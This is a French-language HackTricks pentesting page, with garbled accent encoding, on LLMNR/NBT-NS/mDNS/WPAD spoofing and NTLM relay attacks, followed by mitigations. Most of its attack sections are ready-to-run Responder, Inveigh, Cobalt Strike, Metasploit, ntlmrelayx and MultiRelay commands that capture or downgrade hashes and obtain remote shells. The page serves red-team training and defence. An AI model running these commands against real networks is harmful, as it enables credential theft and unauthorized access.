# Spoofing LLMNR, NBT-NS, mDNS/DNS et WPAD et attaques de relais

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Protocoles r√©seau

### LLMNR, NBT-NS et mDNS

Les syst√®mes Microsoft utilisent la r√©solution de noms multicast locaux (LLMNR) et le service de noms NetBIOS (NBT-NS) pour la r√©solution d'h√¥tes locaux lorsque les recherches DNS √©chouent. Apple Bonjour et les impl√©mentations de configuration z√©ro de Linux utilisent le DNS multicast (mDNS) pour d√©couvrir les syst√®mes au sein d'un r√©seau. Ces protocoles sont non authentifi√©s et diffusent des messages via UDP ; ainsi, les attaquants peuvent les exploiter pour diriger les utilisateurs vers des services malveillants.

Vous pouvez vous faire passer pour des services recherch√©s par les h√¥tes en utilisant Responder pour envoyer de fausses r√©ponses.\
Lisez ici plus d'informations sur [comment se faire passer pour des services avec Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### WPAD

De nombreux navigateurs utilisent la d√©couverte automatique de proxy Web (WPAD) pour charger les param√®tres de proxy √† partir du r√©seau. Un serveur WPAD fournit les param√®tres de proxy du client via une URL particuli√®re (par exemple, _http://wpad.example.org/wpad.dat_) apr√®s avoir √©t√© identifi√© par l'un des suivants :

* DHCP, en utilisant une entr√©e de code 252[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS, en recherchant le nom d'h√¥te _wpad_ dans le domaine local
* Microsoft LLMNR et NBT-NS (en cas d'√©chec de la recherche DNS)

Responder automatise l'attaque WPAD‚Äîex√©cutant un proxy et dirigeant les clients vers un serveur WPAD malveillant via DHCP, DNS, LLMNR et NBT-NS.

## Empoisonnement de protocoles

### Responder - LLMNR, NBT-NS et MDNS

> Responder est un empoisonneur de LLMNR, NBT-NS et MDNS. Il r√©pondra √† des requ√™tes _sp√©cifiques_ de NBT-NS (NetBIOS Name Service) en fonction de leur suffixe de nom (voir : [http://support.microsoft.com/kb/163409](http://support.microsoft.com/kb/163409)). Par d√©faut, l'outil r√©pondra uniquement aux demandes de service de serveur de fichiers, qui sont pour SMB.
>
> Le concept derri√®re cela est de cibler nos r√©ponses et d'√™tre plus discret sur le r√©seau. Cela aide √©galement √† garantir que nous ne perturbons pas le comportement l√©gitime de NBT-NS.

* [**Responder**](https://github.com/lgandx/Responder) est install√© par d√©faut dans kali et le fichier de configuration se trouve dans \*\*`/etc/responder/Responder.conf` \*\* (ici vous pouvez d√©sactiver les serveurs voyous)
* **Responder** va **afficher les hachages √† l'√©cran** et les **√©crire** dans un **fichier log** par h√¥te situ√© dans le r√©pertoire `/usr/share/responder/logs`. Les hachages sont sauvegard√©s au format `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`
* Vous pouvez trouver ici Responder pour **windows** [ici](https://github.com/lgandx/Responder-Windows)
* Responder fonctionne en **ipv4** & **ipv6**

#### Param√®tres de Responder

Responder prend en charge les options suivantes :
```
--version           show program's version number and exit
-h, --help          show this help message and exit
-A, --analyze       Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests without responding.
-I eth0, --interface=eth0
Network interface to use, you can use 'ALL' as a
wildcard for all interfaces
-i 10.0.0.21, --ip=10.0.0.21
Local IP to use (only for OSX)
-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
Poison all requests with another IPv6 address than
Responder's one.
-e 10.0.0.22, --externalip=10.0.0.22
Poison all requests with another IP address than
Responder's one.
-b, --basic         Return a Basic HTTP authentication. Default: NTLM
-r, --wredir        Enable answers for netbios wredir suffix queries.
Answering to wredir will likely break stuff on the
network. Default: False
-d, --DHCP          Enable answers for DHCP broadcast requests. This
option will inject a WPAD server in the DHCP response.
Default: False
-D, --DHCP-DNS      This option will inject a DNS server in the DHCP
response, otherwise a WPAD server will be added.
Default: False
-w, --wpad          Start the WPAD rogue proxy server. Default value is
False
-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
Upstream HTTP proxy used by the rogue WPAD Proxy for
outgoing requests (format: host:port)
-F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
retrieval. This may cause a login prompt. Default:
False
-P, --ProxyAuth     Force NTLM (transparently)/Basic (prompt)
authentication for the proxy. WPAD doesn't need to be
ON. This option is highly effective when combined with
-r. Default: False
--lm                Force LM hashing downgrade for Windows XP/2003 and
earlier. Default: False
--disable-ess       Force ESS downgrade. Default: False
-v, --verbose       Increase verbosity.
```
<details>

<summary>Param√®tres de Responder</summary>

* Le drapeau `-A` nous place en **mode analyse**, nous permettant de voir les requ√™tes NBT-NS, BROWSER et LLMNR dans l'environnement sans empoisonner aucune r√©ponse.
* Nous devons toujours fournir soit une interface, soit une IP.
* `-wf` d√©marrera le serveur proxy WPAD malveillant
* `-f` tentera d'identifier le syst√®me d'exploitation et la version de l'h√¥te distant
* Utilisez le drapeau `-v` pour augmenter la verbosit√© (beaucoup de donn√©es suppl√©mentaires imprim√©es sur la console)
* Des options telles que `-F` et `-P` peuvent √™tre utilis√©es pour forcer l'authentification NTLM ou Basic et forcer l'authentification proxy, mais peuvent provoquer une invite de connexion, donc elles devraient √™tre utilis√©es avec parcimonie.
* Le drapeau `-w` utilise le serveur proxy WPAD int√©gr√©. Cela peut √™tre tr√®s efficace, en particulier dans les grandes organisations, car cela capturera toutes les requ√™tes HTTP par les utilisateurs qui lancent Internet Explorer si le navigateur a [Auto-detect settings](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11) activ√©.

</details>

#### Ex√©cution de Responder

Pour ex√©cuter le comportement par d√©faut de Responder, vous devez seulement ex√©cuter :
```bash
responder -I <Iface> #Default conf
responder -I <Iface> -P -r -v #More chances but might break things
```
Une technique int√©ressante consiste √† utiliser responder pour r√©trograder l'authentification NTLM lorsque c'est possible. Cela permettra de **capturer les d√©fis et les r√©ponses NTLMv1** au lieu de NTLMv2 qui peuvent √™tre **facilement craqu√©s** [**en suivant ce guide**](../../windows-hardening/ntlm/#ntlmv1-attack)**.**
```bash
#Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"
responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
```
Par **d√©faut**, l'**impersonation WPAD ne sera pas ex√©cut√©e**, mais vous pouvez l'ex√©cuter en faisant :
```bash
responder -I <Iface> --wpad
```
Vous pouvez √©galement **r√©soudre les requ√™tes NetBIOS** avec **votre IP**. Et cr√©er un **proxy d'authentification** :
```bash
responder.py -I <interface> -Pv
```
Vous ne pourrez pas intercepter les hachages NTLM (normalement), mais vous pouvez facilement saisir des **d√©fis et r√©ponses NTLM** que vous pouvez **craquer** en utilisant par exemple l'option _**john**_ `--format=netntlmv2`.

Les **journaux et les d√©fis** de l'installation par d√©faut de _**Responder**_ dans kali se trouvent dans `/usr/share/responder/logs`

#### Responder - Empoisonnement DHCP

Windows utilise plusieurs options DHCP personnalis√©es telles que NetBIOS, WINS, les param√®tres WPAD. Lorsqu'un poste de travail envoie une demande DHCP pour obtenir ses param√®tres r√©seau, ces param√®tres suppl√©mentaires peuvent √™tre inclus dans la r√©ponse DHCP pour faciliter la connectivit√© et la r√©solution de noms de mani√®re transparente.

Empoisonner les r√©ponses DHCP sans perturbation peut √™tre difficile car vous interf√©rez avec la configuration r√©seau d'un poste de travail. Habituellement, vous devez avoir une tr√®s bonne connaissance du sous-r√©seau cible, o√π se trouve le serveur DNS, o√π se trouve le commutateur, la table de routage, le domaine, le masque r√©seau, le serveur DHCP, etc. **Toute erreur avec ces param√®tres entra√Ænera une perturbation sur le r√©seau.**

Cependant, l'empoisonnement des r√©ponses DHCP pr√©sente des avantages uniques. **C'est certainement plus discret que l'empoisonnement ARP** ; Une r√©ponse unicast suffit pour empoisonner de mani√®re permanente les informations de routage d'une victime, il est √©galement courant de voir plusieurs serveurs DHCP fonctionner sur un r√©seau. Les r√©ponses DHCP unicast sont plus complexes √† d√©tecter, quelques commutateurs fournissent des param√®tres de s√©curit√© pour emp√™cher le snooping DHCP, cependant ces param√®tres ne sont pas simples et sont souvent mal configur√©s lorsqu'ils sont activ√©s.

> Cette attaque est tr√®s efficace et vous garantit des hachages NTLMv1/2.
```bash
./Responder.py -I eth0 -Pdv
```
#### Responder - Capture des identifiants

Responder va **se faire passer pour tous les services utilisant les protocoles mentionn√©s**. Lorsqu'un utilisateur tente d'acc√©der √† un service r√©solu en utilisant ces protocoles, **il essaiera de s'authentifier contre Responder** et Responder pourra **capturer** les "identifiants" (tr√®s probablement un **d√©fi/r√©ponse NTLMv2**):

Il est possible d'essayer de r√©trograder √† NetNTLMv1 ou d'essayer de d√©sactiver ESS.

![](<../../.gitbook/assets/poison (1) (1) (1).jpg>)

### Inveigh - Responder en C#/PowerShell

> Inveigh est un outil de spoofing ADIDNS/LLMNR/NBNS/mDNS/DNS et d'homme au milieu con√ßu pour aider les pentesteurs/√©quipes rouges qui se retrouvent limit√©s √† un syst√®me Windows.

[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) √©tait un script PowerShell, maintenant c'est un binaire C# qui poss√®de les m√™mes fonctionnalit√©s principales que Responder. Il existe un [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) \*\*\*\* qui liste tous les param√®tres et instructions d'utilisation.
Une autre version est disponible dans [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero).

![](../../.gitbook/assets/45662029-1b5e6300-bace-11e8-8180-32f8d377d48b.png)

Ou ex√©cutez-le avec plus d'options :
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Ou ex√©cutez la version C#:
```bash
Inveigh.exe
```
## Attaque par relais NTLM

Cette attaque relaie les **sessions d'authentification SMB** sur un r√©seau interne vers une **machine cible**. Si la **session d'authentification est r√©ussie**, vous serez automatiquement plac√© dans un **shell syst√®me**. Veuillez noter que l'authentification relay√©e doit provenir d'un **utilisateur ayant un acc√®s Admin Local sur l'h√¥te relay√©** et que **la signature SMB doit √™tre d√©sactiv√©e**.

### Redirection du port 445 et tunneling

{% hint style="warning" %}
Si vous pouvez **introduire une machine dans le r√©seau**, vous pouvez utiliser n'importe quel **outil** de la section suivante pour effectuer une attaque par relais et vous n'avez pas √† vous soucier de cela.
{% endhint %}

Cependant, dans les √©quipes rouges, ce n'est pas le cas, dans les √©quipes rouges, vous aurez g√©n√©ralement besoin de **rediriger le trafic du port 445 d'une machine Windows vers votre machine** en ex√©cutant l'un des outils suivants, puis de **renvoyer le trafic de cet outil via un proxy** pour atteindre la machine √† attaquer √† l'int√©rieur du r√©seau interne.

L'outil [**PortBender**](https://github.com/praetorian-inc/PortBender) est un pilote pour **rediriger** le trafic destin√© au port **445 vers un autre port** (par exemple 8445) que **nous pouvons lier**. Il **n√©cessite un acc√®s admin local** pour que le pilote puisse √™tre charg√©. Il est logique d'utiliser `cd C:\Windows\System32\drivers` puisque c'est l√† que la plupart des pilotes Windows se trouvent.
```bash
Cobalt Strike -> Script Manager -> Load (Select from the filesystem PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Go to drivers dir
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Forward traffic to 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Send traffic to port 8445 to Team Server
beacon> socks 1080 # Socks proxy in port 1080 to attack host in the internal network from the Team Server

# To kill
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Metasploit
```bash
setg Proxies socks4:127.0.0.1:1080 # Use this if you need to route the traffic to reach the attacked ip
set SRVHOST <local_ip>
set SRVPORT 445
set SMBHOST <ip_to_auth_to>
run -j
```
### smbrelayx
```bash
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```
### MultiRelay

Si vous souhaitez utiliser **MultiRelay**, rendez-vous dans _**/usr/share/responder/tools**_ et ex√©cutez MultiRelay (`-t <IP cible> -u <Utilisateur>`):
```bash
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```
### Forcer les connexions NTLM

Sous Windows, **vous pourriez forcer certains comptes privil√©gi√©s √† s'authentifier sur des machines arbitraires**. Lisez la page suivante pour apprendre comment :

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Solution

### D√©sactiver LLMNR

Pour d√©sactiver LLMNR dans votre domaine pour les clients DNS, ouvrez gpedit.msc.\
Naviguez vers Configuration de l'ordinateur->Mod√®les d'administration->R√©seau->Client DNS.\
Localisez l'option ‚ÄúD√©sactiver la r√©solution de noms multicast‚Äù et cliquez sur ‚Äúparam√®tre de la politique‚Äù :

![](../../.gitbook/assets/1.jpg)

Une fois la nouvelle fen√™tre ouverte, activez cette option, cliquez sur Appliquer puis sur OK :

![](../../.gitbook/assets/2.jpg)

### **D√©sactiver NBT-NS**

Une option pour d√©sactiver NBT-NS est d'utiliser les options d'√©tendue DHCP.

Si vous utilisez le serveur DHCP de Microsoft, s√©lectionnez l'√©tendue pour laquelle vous souhaitez d√©sactiver NBT-NS. Faites un clic droit sur ‚ÄúOptions d'√©tendue‚Äù et cliquez sur ‚ÄúConfigurer les options‚Äù. Dans l'exemple ci-dessous, l'√©tendue DHCP dans laquelle je souhaite d√©sactiver NBT-NS est 192.168.1.100.

![](../../.gitbook/assets/3.jpg)

Dans la fen√™tre Options d'√©tendue, acc√©dez √† l'onglet avanc√©, changez la fen√™tre d√©roulante en ‚ÄúOptions Microsoft Windows 2000‚Äù :

![](../../.gitbook/assets/4.jpg)

S√©lectionnez l'option ‚Äú001 Microsoft Disable Netbios Option‚Äù de la liste et changez sa valeur en ‚Äú0x2‚Äù, cliquez sur Appliquer puis sur OK :

![](../../.gitbook/assets/5.jpg)

### WPAD

Pour att√©nuer l'attaque WPAD, vous pouvez ajouter une entr√©e pour "wpad" dans votre zone DNS. Notez que l'entr√©e DNS n'a pas besoin de pointer vers un serveur WPAD valide. Tant que les requ√™tes sont r√©solues, l'attaque sera emp√™ch√©e.

### Multi-relais

1\. **Forcer la signature SMB sur toutes les machines Windows locales**. Ce param√®tre signera num√©riquement chaque session SMB, ce qui oblige le client et le serveur √† v√©rifier la source des paquets avant de continuer. Ce param√®tre est activ√© par d√©faut uniquement sur les contr√¥leurs de domaine. Les articles suivants de Microsoft d√©taillent ces param√®tres (qui peuvent √™tre activ√©s via la strat√©gie de groupe) et comment les mettre en ≈ìuvre.

[https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/](https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always)

2\. **R√©viser et s'assurer que les utilisateurs sur le r√©seau local ne peuvent se connecter √† distance qu'aux machines o√π cela est n√©cessaire**. Par exemple : Sally ne peut se connecter qu'√† la station de travail de Sally. Si un attaquant interceptait la session d'authentification SMB de Sally, il ne pourrait pas relayer la session √† d'autres stations de travail, rendant cette m√©thode inutile.

3\. **Restreindre autant que possible l'authentification NTLM sur le r√©seau local**. Cette attaque ne peut pas tirer parti de l'authentification Kerberos, donc en limitant la quantit√© de NTLM qui se produit, cette attaque peut √™tre grandement entrav√©e. Il existe des informations de Microsoft pour y parvenir, mais soyez averti... Si l'authentification Kerberos √©choue pour une raison quelconque, elle se rabat g√©n√©ralement sur NTLM. Si vous le d√©sactivez enti√®rement, votre r√©seau pourrait s'arr√™ter.

4\. **Emp√™cher les utilisateurs non autoris√©s sur votre r√©seau**. Une menace interne n'utilisera probablement pas une attaque de relais SMB, car elle dispose d√©j√† de justificatifs d'identit√© r√©seau. En renfor√ßant vos politiques de s√©curit√© physique, en emp√™chant les dispositifs non autoris√©s sur le r√©seau avec des ACL et un filtrage MAC, et en assurant une segmentation de r√©seau appropri√©e, vous pouvez grandement limiter la menace de cette attaque.

## R√©f√©rences

* [**https://intrinium.com/smb-relay-attack-tutorial/**](https://intrinium.com/smb-relay-attack-tutorial/)
* **Images de :**\
[https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)\
[https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)\
[https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)\
[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
